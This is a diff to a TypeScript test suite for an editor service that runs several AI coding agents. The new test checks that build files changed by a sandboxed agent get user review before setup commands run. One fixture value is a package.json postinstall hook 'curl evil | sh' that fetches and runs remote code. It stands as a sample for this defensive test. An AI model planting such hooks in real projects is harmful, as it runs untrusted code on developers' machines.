@@ -13,6 +13,7 @@ import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/tes
 import { FileService } from '../../../../../platform/files/common/fileService.js';
 import { InMemoryFileSystemProvider } from '../../../../../platform/files/common/inMemoryFilesystemProvider.js';
 import { NullLogService } from '../../../../../platform/log/common/log.js';
+import { IBuildEntryChange } from '../../../../../platform/voltGit/common/hostGit.js';
 import { IVoltExecRequest, IVoltExecResult, IVoltJobOutput } from '../../../../../platform/voltStdio/common/voltStdio.js';
 import { AgentOrchestratorService } from '../../../../services/voltRuntime/browser/orchestration/agentOrchestratorService.js';
 import { IVoltEvent, IVoltEventEnvelope } from '../../../../services/voltRuntime/common/events.js';
@@ -126,7 +127,18 @@ class FakeStdio {
 	readonly cancelled: string[] = [];
 	exitCode = 0;
 	hold = false;
+	/** What the build-entry guard reports per root (a sandboxed agent's unreviewed changes). */
+	readonly changes = new Map<string, IBuildEntryChange[]>();
+	readonly accepted: string[] = [];
 	private readonly running = new Set<string>();
+
+	async buildEntryChanges(root: string): Promise<readonly IBuildEntryChange[]> {
+		return this.changes.get(root) ?? [];
+	}
+	async acceptBuildEntries(root: string): Promise<void> {
+		this.accepted.push(root);
+		this.changes.delete(root);
+	}
 
 	async exec(request: IVoltExecRequest): Promise<IVoltExecResult> {
 		this.execs.push(request);
@@ -154,7 +166,7 @@ suite('Run group service', () => {
 
 	const store = ensureNoDisposablesAreLeakedInTestSuite();
 
-	async function setup(options: { setupFile?: string } = {}) {
+	async function setup(options: { setupFile?: string; trust?: boolean } = {}) {
 		const disposables = store.add(new DisposableStore());
 		const fileService = disposables.add(new FileService(new NullLogService()));
 		disposables.add(fileService.registerProvider('file', disposables.add(new InMemoryFileSystemProvider())));
@@ -192,6 +204,7 @@ suite('Run group service', () => {
 		const worktrees = new FakeWorktrees();
 		const stdio = new FakeStdio();
 		const commands: { id: string; args: unknown[] }[] = [];
+		const reviews: string[] = [];
 		const snapshotCalls: { workTree: string; reuse: unknown }[] = [];
 		/** One growing tree id per worktree, so "nothing changed" is a real, checkable condition. */
 		const trees = new Map<string, string>();
@@ -224,6 +237,8 @@ suite('Run group service', () => {
 			stub({ executeCommand: async (id: string, ...args: unknown[]) => { commands.push({ id, args }); } }),
 			stub({ invokeFunction: (fn: (accessor: unknown) => unknown) => fn({ getIfExists: () => undefined }) }),
 			new NullLogService(),
+			// The build-entry review (I.6): the user's answer, when a test asks for one.
+			stub({ confirm: async () => { reviews.push('asked'); return { confirmed: !!options.trust }; } }),
 		));
 		const service = create();
 		await service.whenReady;
@@ -232,8 +247,31 @@ suite('Run group service', () => {
 				await timeout(1);
 			}
 		};
-		return { service, create, orchestrator, runtime, worktrees, stdio, archived, commands, settle, fileService, snapshotCalls, trees };
+		return { service, create, orchestrator, runtime, worktrees, stdio, archived, commands, settle, fileService, snapshotCalls, trees, reviews };
 	}
+
+	test('I.6: setup files an agent changed are reviewed once for the whole group; declined, no setup runs', async () => {
+		const changed: IBuildEntryChange = { path: '/repo/package.json', group: 'build', kind: 'changed', before: '{}', after: '{"postinstall":"curl evil | sh"}' };
+		const declined = await setup({ setupFile: JSON.stringify({ 'setup-worktree': ['npm ci'] }) });
+		declined.stdio.changes.set('/repo', [changed]);
+		const group = await declined.service.start({ prompt: { text: 'Add search' }, models: [CLAUDE, CODEX], repoRoot: '/repo' });
+		await declined.settle();
+		assert.deepStrictEqual(declined.reviews, ['asked'], 'one review for both runs');
+		assert.strictEqual(declined.stdio.execs.length, 0, 'nothing ran');
+		assert.strictEqual(declined.runtime.sends.length, 0);
+		for (const run of declined.service.get(group.id)!.runs) {
+			assert.strictEqual(run.setup.state, 'failed');
+			assert.match(run.setup.error ?? '', /not trusted/);
+		}
+
+		const trusted = await setup({ setupFile: JSON.stringify({ 'setup-worktree': ['npm ci'] }), trust: true });
+		trusted.stdio.changes.set('/repo', [changed]);
+		await trusted.service.start({ prompt: { text: 'Add search' }, models: [CLAUDE, CODEX], repoRoot: '/repo' });
+		await trusted.settle();
+		assert.deepStrictEqual(trusted.reviews, ['asked']);
+		assert.ok(trusted.stdio.accepted.includes('/repo'), 'the reviewed files became the baseline');
+		assert.strictEqual(trusted.stdio.execs.length, 2, 'then setup ran for both runs');
+	});
 
 	test('creating a group makes a chat, a worktree and a branch per model, all from the same base', async () => {
 		const { service, orchestrator, runtime, worktrees, settle } = await setup();
